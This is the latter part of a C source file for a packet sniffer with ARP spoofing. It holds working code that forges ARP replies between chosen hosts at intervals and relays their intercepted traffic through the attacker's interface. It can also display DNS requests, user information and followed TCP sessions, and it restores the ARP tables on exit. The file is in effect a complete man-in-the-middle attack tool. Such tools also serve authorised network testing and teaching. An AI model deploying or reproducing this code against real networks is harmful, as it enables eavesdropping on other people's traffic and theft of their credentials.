		arp_inet_orig[ ADDR_BUFFER_LEN ],
		arp_inet_dest[ ADDR_BUFFER_LEN ];

	printf( "[%s] %s(%s) [%i]> %s(%s) \n",
		spoof ? "spoofed" : "real",
		inetaddr_to_str( params->arp_inet_orig, arp_inet_orig, 
			       ADDR_BUFFER_LEN ),
		hwaddr_to_str( params->arp_hw_orig, arp_hw_orig, 
			       ADDR_BUFFER_LEN ),
		params->operation,
		inetaddr_to_str( params->arp_inet_dest, arp_inet_dest, 
			       ADDR_BUFFER_LEN ),
		hwaddr_to_str( params->arp_hw_dest, arp_hw_dest, 
			       ADDR_BUFFER_LEN ) );
}

int do_spoof_hosts( int spoof, struct interface_t *interface )
{
	int	_from,
		_dest;
	struct host_t
		*from,
		*dest;
	struct packet_t
		packet;
	struct arp_params
		params = {
			.operation = ARP_REPLY
		};

	if( list_empty( &spoofed_hosts ) )
		return( 1 );

	packet.data = ( uint8_t* ) allocate( interface->mtu );
	
	for( _dest = 0; _dest < list_size( &spoofed_hosts ); _dest++ ){
		dest = list_value( &spoofed_hosts, _dest, struct host_t* );
		for( _from = 0; _from < list_size( &spoofed_hosts ); _from++ ){
			from = list_value( &spoofed_hosts, _from, 
					struct host_t* );
			
			if( from == dest )
				continue;
	
			params.eth_dest = dest->hw_address;
			params.arp_hw_dest = dest->hw_address;
			params.arp_inet_orig = from->inet_address;
			params.arp_inet_dest = dest->inet_address;

			if( spoof ){
				params.eth_orig = interface->hw_address;
				params.arp_hw_orig = interface->hw_address;
			}else{
				params.eth_orig = from->hw_address;
				params.arp_hw_orig = from->hw_address;
			}
			
			make_arp_packet( &params, &packet );
			if( options.flags & __verbose )
				show_spoofed_arp( &params, spoof );

			if( send_raw_packet( sd, &packet, interface ) < 0 ){
				release( packet.data );
				return( -1 );
			}
		}
	}
	
	release( packet.data);

	/* we should this again after 'SPOOF_ALARM' seconds */
	alarm( SPOOF_ALARM );
	
	return( 1 );
}

int spoof_hosts( struct interface_t *interface )
{
	struct host_t
		*host;
	struct packet_t
		packet;
	int	counter = 0;

	if( list_empty( &spoofed_hosts ) )
		return( 1 );

	packet.data = ( uint8_t* ) allocate( interface->mtu );

	if( set_non_blocking( sd, 1 ) < 0 )
		return( -1 );
	
	while( counter < list_size( &spoofed_hosts ) ){
		host = list_value( &spoofed_hosts, counter, 
				   struct host_t* );
		if( options.flags & __verbose )
			printf( "sending arp request to %s... ", host->name );

		if( str_to_inetaddr( host->name, host->inet_address, 
					IP_ADDR_SIZE ) < 0 )
			return( -1 );
		
		if( do_arp_request( interface, host->inet_address, 
				    host->hw_address, &packet, sd ) < 0 )
			return( -1 );
		
		if( !same_mac( host->hw_address, zeroed_mac ) ){
			if( options.flags & __verbose )
				printf( "found \n" );
			counter++;
		}else{
			if( options.flags & __verbose )
				printf( "NOT found \n" );
			release( host->name );
			release( host );
			list_remove( &spoofed_hosts, counter );
			if( host == router )
				router = NULL;
		}
	}

	release( packet.data );
	
	if( set_non_blocking( sd, 0 ) < 0 )
		return( -1 );

	if( list_size( &spoofed_hosts ) < 2 ){
		printf( "spoof_hosts(): not enough hosts to "
			"do the spoofing \n" );
		return( 1 );
	}

	options.flags |= __spoofing_on;
	
	return( do_spoof_hosts( 1, interface ) );
}

void forward_packet( struct pkt_pointers_t *pkt )
{
	struct eth_header
		*e_header = ( struct eth_header* ) pkt->l2_pointer;
	struct ip_header
		*i_header = ( struct ip_header* ) pkt->l3_pointer;
	struct	host_t 
		*host = NULL;

	/* if the frame is not for us, we don't need to forward it */
	if( !same_mac( e_header->dest_addr, interface.hw_address ) )
		return;

	/* if the dest_ip address is our address, there's no need to forward */
	if( same_ip( i_header->dest_addr, interface.inet_address ) )
		return;
	
	/* at this point, we know that the frame is for us but the ip address
	 * is not. so we'll need to forward the packet (to another spoofed 
	 * host, or to the router, in case we can't find the ip). but first,
	 * we need to know whether the sender is one of the spoofed hosts... */
	for_each_host( host, &spoofed_hosts ){
		if( same_mac( e_header->orig_addr, host->hw_address ) )
			goto _find_dest;
	}

	/* ... it wasn't, so */
	return;

_find_dest:
	/* ... it was, now we need to decide where to send the packet */
	for_each_host( host, &spoofed_hosts ){
		if( same_ip( i_header->dest_addr, host->inet_address ) ){
			memcpy( e_header->dest_addr, host->hw_address,
					MAC_ADDR_SIZE );
			goto _forward;
		}
	}

	if( router ){
		memcpy( e_header->dest_addr, router->hw_address, 
				MAC_ADDR_SIZE );
		goto _forward;
	}
	
	printf( "WARNING: pkt's dst ip isn't in the spoof list "
		"and there's no router \n" );
	return;

_forward:
	memcpy( e_header->orig_addr, interface.hw_address, MAC_ADDR_SIZE );

	if( send_raw_packet( sd, &pkt->packet, &interface ) < 0 ){
		printf( "WARNING: couldn't forward the packet \n" );
		return;
	}
	
	counter.forwarded++;
}

void release_spoofed_hosts( void )
{
	struct host_t *host;

	for_each_host( host, &spoofed_hosts ){
		release( host->name );
		release( host );
	}

	list_clean( &spoofed_hosts );
}

void revert_spoofing_state( void )
{
	if( options.flags & __verbose && options.flags & __spoofing_on )
		printf( "restoring hosts' ARP tables... \n" );

	do_spoof_hosts( 0, &interface );

	release_spoofed_hosts();
}

/**************************** FILTERING ***************************************/

#define POLICY_ALLOW	0x01
#define POLICY_EXCLUDE	0x02

int	filter_policy = POLICY_EXCLUDE;
_list_t	filters	= LIST_INITIALIZER;

void add_filter( char *name )
{
	struct host_t
		*host;

	host = ( struct host_t* ) allocate( sizeof( struct host_t ) );
	host->name = ( char* ) allocate( strlen( name ) + 1 );
	memcpy( host->name, name, strlen( name ) );
	
	if( str_to_inetaddr( host->name, host->inet_address, 
				IP_ADDR_SIZE ) < 0 ){
		printf( "%s: invalid host \n", host->name );
		release( host->name );
		release( host );
		return;
	}

	list_append( host, &filters );
}

void add_excluded_host( char *host )
{
	if( filter_policy == POLICY_ALLOW ){
		printf( "wrong parameters: excluding with POLICY_ALLOW \n" );
		return;
	}

	add_filter( host );
}

void add_allowed_host( char *host )
{
	if( filter_policy == POLICY_EXCLUDE 
	 && !list_empty( &filters ) ){
		printf( "wrong parameters: allowing with POLICY_EXCLUDE \n" );
		return;
	}
	
	filter_policy = POLICY_ALLOW;
	add_filter( host );
}

int filtered( struct pkt_pointers_t *pkt_p )
{
	struct host_t
		*host;
	struct arp_header
		*a_header = ( struct arp_header* ) pkt_p->l3_pointer;
	struct ip_header
		*i_header = ( struct  ip_header* ) pkt_p->l3_pointer;

	if( list_empty( &filters ) )
		return( 0 );
	
	if( pkt_p->tl == __tl_eth )
		return( 0 );

	/* when the packet's ip orig or dest is matched, it will be filtered
	 * based on the active policy. if it's EXCLUDE, then matching is
	 * the condition to filter the packet. otherwise it means that the
	 * policy is ALLOW, so the packet is explicity allowed, so it won't
	 * be filtered */

	for_each_host( host, &filters ){
		if( ( pkt_p->tl == __tl_arp &&
		    ( same_ip( host->inet_address, a_header->orig_net_addr ) ||
		      same_ip( host->inet_address, a_header->dest_net_addr )) )
		    ||
		    ( pkt_p->tl != __tl_arp &&
		    ( same_ip( host->inet_address, i_header->orig_addr ) ||
		      same_ip( host->inet_address, i_header->dest_addr )) ) ){
			if( filter_policy == POLICY_EXCLUDE )
				goto _filter;
			else	goto _allow;
		}
	}
	
	/* here it comes the relevance of the policy: when the ip isn't 
	 * matched, what happens? if the policy is ALLOW, only the matching
	 * packet are allowed, all the rest has to be filtered. if the policy
	 * is EXCLUDE, only the matching packets will be filtered, the others
	 * no */

	if( filter_policy == POLICY_EXCLUDE )
		goto _allow;

_filter:
	counter.filtered++;
	return( 1 );
_allow:
	return( 0 );
}

void release_filters()
{
	struct host_t
		*host;

	for_each_host( host, &filters ){
		release( host->name );
		release( host );
	}

	list_clean( &filters );
}

/****************************************************************************/

void sniff_em_all( void )
{
	uint8_t	
		buffer[ BUFFER_SIZE ];
	struct pkt_pointers_t
		pkt;

	pkt.packet.data = buffer;

	do{
		memset( pkt.packet.data, 0x00, BUFFER_SIZE );
		reset_pkt_pointers( &pkt );

		pkt.packet.size = get_raw_packet( sd, 
				pkt.packet.data, BUFFER_SIZE );
	
		if( pkt.packet.size < 0 ){
			fprintf( stderr, 
				"WARNING: pkt.packet.size < 0 !! \n" );
			continue;
		} 

		counter.packets++;
		counter.bytes += pkt.packet.size;

		parse_packet( &pkt );
	
		if( !filtered( &pkt ) ){
			if( options.flags & __dns_only )
				show_dns_request( &pkt );

			if( options.flags & __user_only )
				show_user_info( &pkt );
		
			if( options.flags & __list_desc )
				show_description( &pkt );
		
			if( options.flags & __long_desc )
				show_packet( &pkt );
			
			if( options.flags & __full_packets ){
				hexdump( pkt.packet.data, pkt.packet.size );
				putchar( 0x0a );
			}
		}
		
		if( options.flags & __follow_tcp )
			follow_tcp_flow( &pkt );
		
		if( options.flags & __spoofing_on )
			forward_packet( &pkt );
		
	}while(	counter.packets != options.max_packets );
}

void sig_handler( int signum )
{
	switch( signum ){
		case( SIGINT ):
		case( SIGTERM ):
			at_exit();
			exit( 0 );
			break;
		case( SIGALRM ):
			if( !( options.flags & __spoofing_on ) )
				break;
			do_spoof_hosts( 1, &interface );
			break;
	}
}

void set_signal_handlers( void )
{
	struct sigaction
		action;

	action.sa_handler = sig_handler;

	sigaction( SIGINT, &action, NULL );
	sigaction( SIGTERM, &action, NULL );
	sigaction( SIGALRM, &action, NULL );
}

void at_exit( void )
{
	show_tcp_connections();
	release_tcp_connections();
	revert_promiscuous();
	release_filters();
	revert_spoofing_state();

	show_totals();
	print_mem_usage( stdout );
}

void show_totals( void )
{
	if( !(options.flags & __verbose) )
		return;

	printf( " packets: %li ( %li bytes, %2.4f kb, %2.4f mb ) \n"
		"  |-- arp: %li \n"
		"  `--- ip: %li \n"
		"    |-- tcp: %li \n"
		"    |-- udp: %li \n"
		"    `- icmp: %li \n"
		"   filtered: %li \n"
		"  forwarded: %li \n",
		counter.packets, counter.bytes, 
		(double)counter.bytes / 1024,
		(double)counter.bytes / ( 1024 * 1024 ), 
		counter.arp, 
		counter.ip, counter.tcp,
		counter.udp, counter.icmp,
		counter.filtered,
		counter.forwarded );
}

int main( int argc, char *argv[] )
{
	int	promiscuous = 0;
	char	opt;

	clear_area( &options, sizeof( struct options_t ) );
	clear_area( &counter, sizeof( struct counter_t ) );

	while( (opt = getopt( argc, argv, "tdulLfTnvpr:s:e:a:i:m:" )) > 0 )
		switch( opt ){
			case( 't' ):
				options.flags |= __show_timestamp;
				break;
			case( 'd' ):
				options.flags |= __dns_only;
				break;
			case( 'u' ):
				options.flags |= __user_only;
				break;
			case( 'l' ):
				options.flags |= __list_desc;
				break;
			case( 'L' ):
				options.flags |= __long_desc;
				break;
			case( 'f' ):
				options.flags |= __full_packets;
				break;
			case( 'T' ):
				options.flags |= __follow_tcp;
				break;
			case( 'n' ):
				options.flags |= __follow_new_only;
				break;
			case( 'v' ):
				options.flags |= __verbose;
				break;
			case( 'p' ):
				promiscuous++;
				break;
			case( 'r' ):
				set_router( optarg );
				break;
			case( 's' ):
				add_spoofed_host( optarg );
				break;
			case( 'e' ):
				add_excluded_host( optarg );
				break;
			case( 'a' ):
				add_allowed_host( optarg );
				break;
			case( 'i' ):
				interface.name = optarg;
				break;
			case( 'm' ):
				options.max_packets = atoi( optarg );
				break;
		}

	if( ( show_interface_info() < 0 ) ||
	    ( (sd = prepare_raw_to_receive( &interface )) < 0 ) ||
	    ( promiscuous && (set_promiscuous_mode( 1 ) < 0) ) ||
	    ( spoof_hosts( &interface ) < 0 ) )
		exit( EXIT_FAILURE );

	set_signal_handlers();
	sniff_em_all();
	at_exit();

	return( 0 );
}
